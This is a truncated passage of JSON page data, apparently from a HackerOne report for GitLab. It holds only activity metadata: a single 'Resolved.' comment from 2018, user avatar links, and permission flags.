0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2422289,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Resolved.","markdown_message":"\u003cp\u003eResolved.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-22T18:11:44.707Z","updated_at":"2018-02-22T18:11:44.707Z","actor":{"username":"kathyw","cleared":false,"url":"/kathyw","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}